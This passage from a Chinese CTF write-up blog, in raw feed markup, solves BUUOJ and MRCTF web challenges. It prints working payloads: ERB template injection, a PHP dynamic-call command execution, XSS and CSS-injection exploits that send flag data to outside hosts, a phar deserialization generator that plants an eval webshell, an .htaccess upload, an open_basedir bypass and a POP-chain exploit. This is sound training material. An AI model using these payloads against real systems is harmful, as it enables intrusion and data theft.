auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;</span><br><span class="line">    cookies[:auth] &#x3D; auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>如果传入的do参数和name参数一致，会输出<code>{params[:name][0,7]} working successfully!</code></p><p>但是限制了只能输入7个字符，除去&lt;%==&gt;只有两个字符可以利用，这时可以利用ruby全局变量$&amp;，可以获得上一次正则匹配的结果</p><p>payload：<code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414232933574.png" alt></p><p>成功拿到secret,接着伪造cookie</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233126939.png" alt></p><p>回到页面，buy flag，抓包将伪造的cookie写进去，在返回的包里拿到新的cookie，解密得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233252575.png" alt></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233323947.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md" target="_blank" rel="noopener">https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md</a></p></blockquote><h3 id="0x-07-NESTCTF-2019-Love-Math-2"><a href="#0x-07-NESTCTF-2019-Love-Math-2" class="headerlink" title="0x 07 [NESTCTF 2019]Love Math 2"></a>0x 07 [NESTCTF 2019]Love Math 2</h3><ul><li><p>考点</p><p>php动态特性捕捉</p></li><li><p>解题过程</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; [‘abs‘, ‘acos‘, ‘acosh‘, ‘asin‘, ‘asinh‘, ‘atan2‘, ‘atan‘, ‘atanh‘,  ‘bindec‘, ‘ceil‘, ‘cos‘, ‘cosh‘, ‘decbin‘ , ‘decoct‘, ‘deg2rad‘, ‘exp‘, ‘expm1‘, ‘floor‘, ‘fmod‘, ‘getrandmax‘, ‘hexdec‘, ‘hypot‘, ‘is_finite‘, ‘is_infinite‘, ‘is_nan‘, ‘lcg_value‘, ‘log10‘, ‘log1p‘, ‘log‘, ‘max‘, ‘min‘, ‘mt_getrandmax‘, ‘mt_rand‘, ‘mt_srand‘, ‘octdec‘, ‘pi‘, ‘pow‘, ‘rad2deg‘, ‘rand‘, ‘round‘, ‘sin‘, ‘sinh‘, ‘sqrt‘, ‘srand‘, ‘tan‘, ‘tanh‘];</span><br><span class="line">for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j &#x3D; 0;$j &lt;&#x3D;9;$j++)&#123;</span><br><span class="line">            $exp &#x3D; $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;&lt;command&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/yesec/p/12664136.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12664136.html</a></p></blockquote><h3 id="0x-08-Zer0pts2020-Can-you-guess-it"><a href="#0x-08-Zer0pts2020-Can-you-guess-it" class="headerlink" title="0x 08 [Zer0pts2020]Can you guess it?"></a>0x 08 [Zer0pts2020]Can you guess it?</h3><ul><li><p>考点</p><p>正则污染绕过、代码审计</p></li><li><p>解题过程</p></li></ul><ol><li>打开题目访问源代码进行审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$_SERVER[&#39;PHP_SELF&#39;]表示当前php文件相对于网站根目录的位置地址</span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); &#x2F;&#x2F;basename() 函数返回路径中的文件名部分</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line">  $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>问题出在了basename()函数可以跨目录读取文件，但是需要绕过正则，这里可以用污染绕过，贴一下y1ng师傅的fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">for i in range (0,500):</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;814589eb-4094-4449-bf79-39388aa86610.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;&#123;&#125;?source&#39;.format(hex(i).replace(&#39;0x&#39;, &#39;%&#39;))</span><br><span class="line">r &#x3D; requests.get(url)</span><br><span class="line">print(url)</span><br><span class="line">if r&quot;flag&quot; in r.text:</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><p>可以fuzz出很多可以用的参数</p><h3 id="0x-09-Zer0pts2020-musicblog"><a href="#0x-09-Zer0pts2020-musicblog" class="headerlink" title="0x 09 [Zer0pts2020]musicblog"></a>0x 09 [Zer0pts2020]musicblog</h3><ul><li><p>考点</p><p>代码设计、XSS bypass</p></li><li><p>解题过程</p></li></ul><ol><li><p>下载题目附件进行审计，在work.js中发现存在flag且设置在浏览器UA中，后台机器人会点击<code>#like</code>标签<img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420224644867.png" alt></p></li><li><p>审计<code>utli.php</code>发现</p></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420225324470.png" alt></p><p>字符串会被加载到<code>&lt;audio&gt;</code>标签并解析到页面，输入的内容经过一次strip_tags处理。</p><p>没有过滤其他内容，可以在``中插入任意内容，但是受CSP-nonce的限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nonce &#x3D; get_nonce();</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-$&#123;nonce&#125;&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types&quot;);</span><br><span class="line">header(&#39;X-Frame-Options: DENY&#39;);</span><br><span class="line">header(&#39;X-XSS-Protection: 1; mode&#x3D;block&#39;);</span><br></pre></td></tr></table></figure><p>而这个<code>strip_tags()</code>存在bug:<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200420230614404.png" alt></p><p><img src="http://static.zybuluo.com/1160307775/5vrpxpsvcopf7bucy1q2y4h1/image_1e2uhu2v810fc1l7ppa4l41mqm20.png" alt="image_1e2uhu2v810fc1l7ppa4l41mqm20.png-53.5kB"></p><p>MusicBlog 中使用的是<code>&lt;audio&gt;</code>作为白名单，<code>&lt;a/udio&gt;</code>可以通过函数处理，并且<code>&lt;a/udio&gt;</code>会作为 超链接<code>&lt;a&gt;</code>被解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;</span><br></pre></td></tr></table></figure><p>经过处理后展开是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls src&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;&lt;a&#x2F;udio href&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;vtaf6wvt&quot; id&#x3D;&quot;like&quot;&gt;test&lt;&#x2F;a&#x2F;udio&gt;&lt;audio a&#x3D;&quot;&quot;&gt;&lt;&#x2F;audio&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog" target="_blank" rel="noopener">https://www.hpdoger.cn/2020/03/10/Zer0pts%202020%20CTF-Web%E9%A2%98%E8%A7%A3/#MusicBlog</a></p><p><a href="https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/" target="_blank" rel="noopener">https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/</a></p></blockquote><h3 id="0x-10-安洵杯-2019-cssgame"><a href="#0x-10-安洵杯-2019-cssgame" class="headerlink" title="0x 10 [安洵杯 2019]cssgame"></a>0x 10 [安洵杯 2019]cssgame</h3><ul><li><p>考点</p><p>CSS注入</p></li><li><p>解题过程</p></li></ul><ol><li>打开靶机，显示界面如下：</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222257298.png" alt></p><p>右键查看源代码发现：</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200421222412267.png" alt></p><p>可以看到flag的值就在标签<code>&lt;input&gt;</code>的<code>value</code>属性</p><p>然后我们通过靶机发送<code>css</code>参数给内网的flag.html，flag.html接收后将<code>css</code>拼接到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;$&#123;encodeURI(req.query.css)&#125;&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>通过<strong>css injection</strong>来窃取内网flag值，这里可以参考微笑师傅的文章：<a href="https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/" target="_blank" rel="noopener">https://www.smi1e.top/%e9%80%9a%e8%bf%87css%e6%b3%a8%e5%85%a5%e7%aa%83%e5%8f%96html%e4%b8%ad%e7%9a%84%e6%95%b0%e6%8d%ae/</a></p><p>构造exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line"></span><br><span class="line">f &#x3D; open(&quot;poc.css&quot;, &quot;w&quot;)</span><br><span class="line">dic &#x3D; &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-&quot;</span><br><span class="line">for i in dic:</span><br><span class="line">    flag &#x3D; sys.argv[1] + i</span><br><span class="line">    payload &#x3D; &quot;input[name&#x3D;flag][value^&#x3D;\&quot;&quot; + flag + &quot;\&quot;] ~ * &#123;background-image: url(\&quot;http:&#x2F;&#x2F;174.0.108.172:8080&#x2F;?&quot; + flag + &quot;\&quot;);&#125;&quot;</span><br><span class="line">    f.write(payload + &quot;\n&quot;)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>将<code>css=http://174.0.108.172/poc.css</code>post给<code>crawl.html</code>,在nc监听中可以得到flag</p><p>这里环境问题数据可能会传不到内网，需要不停的发包直至收到nc收到请求的信息，坑了我一上午，我裂开了</p><p>参考资料：</p><blockquote><p><a href="https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/" target="_blank" rel="noopener">https://yanmymickey.github.io/2020/04/17/CTFwp/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Dcssgame/</a></p></blockquote><h3 id="0x-11-D3CTF-2019-EzUpload"><a href="#0x-11-D3CTF-2019-EzUpload" class="headerlink" title="0x 11 [D3CTF 2019]EzUpload"></a>0x 11 [D3CTF 2019]EzUpload</h3><ul><li><p>考点</p><p>文件上传、反序列化</p></li><li><p>解题过程</p></li></ul><ol><li>题目给了源代码，首先进行审计，发现接受三个参数将文件写入，同时对输入的进行了检查</li></ol><p><code>checkdir()</code>检查了<code>$this-&gt;userdir</code>，</p><p><code>checkurl()</code>禁止了url出现<code>php|file</code>，防止使用两种伪协议读取本地文件，除了vps上设置文件还可以使用<code>data://</code>协议</p><p><code>checkext()</code>禁止了<code>filename</code>出现<code>..</code>、<code>/</code>、<code>ph</code>，可以联想到使用.htaccess，但是对内容进行了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;&#x2F;\&lt;\?|value|on|type|flag|auto|set|\\\\&#x2F;i&quot;, $content))&#123;</span><br><span class="line">die(&#39;hacker!!!&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以参考：<a href="https://www.freebuf.com/vuls/218495.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218495.html</a></p><p>传入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure><p>另外有一个问题是<code>__destruct</code>这个魔术方法，如果序列化对象的时候触发，当前的工作路径是根目录<code>/</code>,因此没有写入权限</p><p>第一步，寻找phar反序列化触发点，可以通过<code>upload()</code>方法中的 <code>$content = file_get_contents($this-&gt;url,NULL,NULL,0,2048);</code></p><p>第二步，获取<code>upload/</code>目录的绝对路径，可以通过<code>__destruct()</code>中的 <code>echo $string;</code> 触发<code>__toString()</code>，打印<code>__DIR__</code></p><p>payload1:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dir&#123;</span><br><span class="line">    public $userdir;</span><br><span class="line">    public $url;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d &#x3D; new dir();</span><br><span class="line">$d-&gt;userdir &#x3D; new dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir &#x3D; &quot;..&#x2F;&quot;;</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line">$phar &#x3D; new Phar(&quot;1.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89A&quot;.&quot;__HALT_COMPILER();&quot;); &#x2F;&#x2F;设置stub，增加gif文件头用以欺骗检测</span><br><span class="line">$phar-&gt;setMetadata($d); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.jpg&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将生成的phar文件重命名为1，gzip压缩后上传到内网服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 28396 &#x2F;var&#x2F;www&#x2F;html&#x2F;1.gz root@node3.buuoj.cn:&#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br></pre></td></tr></table></figure><p>然后上传文件</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200428091635909.png" alt></p><p>触发反序列化，得到实际文件路径为：<code>/var/www/html/6dfe08eda761bd32/upload/48cd8b43081896fbd0931d204f947663</code></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200428091742661.png" alt></p><p>构造shell如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dir&#123;</span><br><span class="line">    public $userdir;</span><br><span class="line">    public $url;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">$this-&gt;filename &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;67e103b0761e6068&#x2F;upload&#x2F;48cd8b43081896fbd0931d204f947663&#x2F;lanxiaojun&#39;;</span><br><span class="line">    $this-&gt;userdir &#x3D; &#39;zzzzzzzzz&lt;?php eval($_POST[&quot;xxx&quot;]); ?&gt;zzzzzzzzzzz&#39;;</span><br><span class="line">    </span><br><span class="line">    $this-&gt;url &#x3D; &#39;1&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d &#x3D; new dir();</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line">$phar &#x3D; new Phar(&quot;lanxiaojun.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89A&quot;.&quot;__HALT_COMPILER();&quot;); &#x2F;&#x2F;设置stub，增加gif文件头用以欺骗检测</span><br><span class="line">$phar-&gt;setMetadata($d); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.jpg&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里需要注意的是我们用gzip压缩的时候，刚好含有一些特殊字符，如<code>\</code>等，可以在原来的数据中增加一些额外的数据来绕过。同样的方法上传，触发反序列化。</p><p>接着是上传<code>.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>访问shell的页面，绕过<code>open_basedir和disable_function</code>，拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);var_dump(scandir(&#39;&#x2F;&#39;));echo file_get_contents(&#39;F1aG_1s_H4r4&#39;);</span><br></pre></td></tr></table></figure><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200428092222247.png" alt="image-20200428092222247"></p><p>参考资料：</p><blockquote><p><a href="https://glotozz.github.io/2020/04/02/buuctf-wp/#d3ctf-2019ezupload" target="_blank" rel="noopener">https://glotozz.github.io/2020/04/02/buuctf-wp/#d3ctf-2019ezupload</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/104423207" target="_blank" rel="noopener">https://blog.csdn.net/a3320315/article/details/104423207</a></p><p><a href="https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/#ezupload</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot;&gt;&lt;a href=&quot;#0x-01-PWNHUB-公开赛-2018-傻-fufu-的工作日&quot; class=&quot;headerlink&quot; title=&quot;0x 01 [PWNHUB 公开赛 2018]傻 f
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF复盘题解</title>
    <link href="http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"/>
    <id>http://yoursite.com/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/</id>
    <published>2020-03-31T00:04:00.000Z</published>
    <updated>2020-04-02T15:46:03.229Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ez-bypass"><a href="#0x-01-Ez-bypass" class="headerlink" title="0x 01 Ez_bypass"></a>0x 01 Ez_bypass</h4><p>第一层数组绕过，第二层弱类型比较绕过</p><h4 id="0x-02-你传你🐎呢"><a href="#0x-02-你传你🐎呢" class="headerlink" title="0x 02 你传你🐎呢"></a>0x 02 你传你🐎呢</h4><p>上传.htaccess绕过</p><h4 id="0x-03-PYWebsite"><a href="#0x-03-PYWebsite" class="headerlink" title="0x 03 PYWebsite"></a>0x 03 PYWebsite</h4><p>XFF伪造127.0.0.1得到flag</p><h4 id="0x-04-Ezpop"><a href="#0x-04-Ezpop" class="headerlink" title="0x 04 Ezpop"></a>0x 04 Ezpop</h4><ol><li><code>__wakeup()</code>方法通过<code>preg_match()</code>将<code>$this-&gt;source</code>做字符串比较，如果<code>$this-&gt;source</code>是<code>Show</code>类，就调用了<code>__toString()</code>方法；</li><li><code>__toString()</code>访问了<code>str</code>的<code>source</code>属性，<code>str</code>是<code>Test</code>类，不存在<code>source</code>属性，就调用了<code>Test</code>类的<code>__get()</code>魔术方法；</li><li><code>__get()</code>方法将<code>p</code>作为函数使用，<code>p</code>实例化为<code>Modify</code>类，就调用了<code>Modifier</code>的<code>__invoke()</code>方法；</li><li><code>__invoke()</code>调用了<code>append()</code>方法，包含<code>$value</code>，若将<code>$value</code>为伪协议，则可读flag.php源码</li></ol><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;aaa&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new Show(&#39;aaa&#39;);</span><br><span class="line">$o-&gt;str&#x3D; new Test();</span><br><span class="line">$lxj &#x3D; new Show($o);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($lxj));</span><br></pre></td></tr></table></figure><h4 id="0x-05-套娃"><a href="#0x-05-套娃" class="headerlink" title="0x 05 套娃"></a>0x 05 套娃</h4><ul><li>第一关</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;</span><br><span class="line">    die(&#39;Y0u are So cutE!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br></pre></td></tr></table></figure><p>第一层匹配了<code>_</code>符号和它的url编码值，有如下方法绕过：</p><ol><li>%5F</li><li>b.u.p.t（点代替_）</li><li>b u p t（空格代替_）</li></ol><p>第二层换行污染绕过，最终payload：?b.u.p.t=23333%0a</p><ul><li>第二关</li></ul><p>伪造本地访问得到jsfuck提示<code>post me Merak</code>，post一个Merak参数得到源代码</p><figure class="highlight 